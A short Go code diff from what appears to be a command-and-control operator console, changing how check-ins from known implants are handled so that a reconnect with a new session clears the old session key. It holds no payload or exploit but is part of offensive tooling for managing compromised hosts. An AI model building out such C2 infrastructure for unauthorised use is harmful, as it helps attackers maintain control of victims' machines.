@@ -711,16 +711,21 @@ func (op *Operator) handleCheckin(result map[string]interface{}) {
 		return
 	}
 	clientID, _ := info["client_id"].(string)
-
-	// Skip if already known
-	if _, exists := op.connectedClients[clientID]; exists {
-		return
-	}
-
 	hostname, _ := info["hostname"].(string)
 	osInfo, _ := info["os"].(string)
 	user, _ := info["user"].(string)
 	sessionID, _ := info["session_id"].(string)
+
+	// If already known with same session, skip (duplicate heartbeat)
+	if existing, exists := op.connectedClients[clientID]; exists {
+		if existing.SessionID == sessionID {
+			return // same session, already connected
+		}
+		// Different session — agent reconnected, update and re-negotiate
+		fmt.Printf("\n\033[36m[*] Implant %s reconnected (new session)\033[0m\n",
+			clientID[:8])
+		delete(op.sessionKeys, clientID) // clear old session key
+	}
 	pid := 0
 	if p, ok := info["pid"].(float64); ok {
 		pid = int(p)
